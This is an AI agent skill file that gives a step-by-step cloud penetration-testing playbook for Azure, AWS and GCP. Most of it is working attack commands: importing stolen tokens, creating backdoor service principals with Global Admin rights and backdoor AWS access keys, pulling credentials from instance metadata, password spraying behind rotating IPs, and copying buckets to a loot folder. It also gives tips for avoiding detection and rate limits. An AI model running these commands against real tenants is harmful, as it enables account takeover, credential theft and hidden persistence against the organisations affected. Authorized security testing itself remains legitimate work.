---
name: cloud-penetration-testing
description: Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). Use when the task involves cloud penetration testing.
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# Cloud Penetration Testing

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl -fsSLo /tmp/google-cloud-sdk-install.sh https://sdk.cloud.google.com
sed -n '1,160p' /tmp/google-cloud-sdk-install.sh
bash /tmp/google-cloud-sdk-install.sh
gcloud init

# Additional tools
pip install scoutsuite pacu
> See [references/details.md](references/details.md) for full code examples.
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:/Temp/StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:/Temp/AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

> See [references/details.md](references/details.md) for full code examples.

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

> See [references/details.md](references/details.md) for full code examples.

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

> See [references/details.md](references/details.md) for full code examples.

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

> See [references/details.md](references/details.md) for full code examples.

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

> See [references/details.md](references/details.md) for full code examples.

## Quick Reference

### Azure Key Commands

> See [references/details.md](references/details.md) for full code examples.

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module ./MSOLSpray.ps1
Invoke-MSOLSpray -UserList ./users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
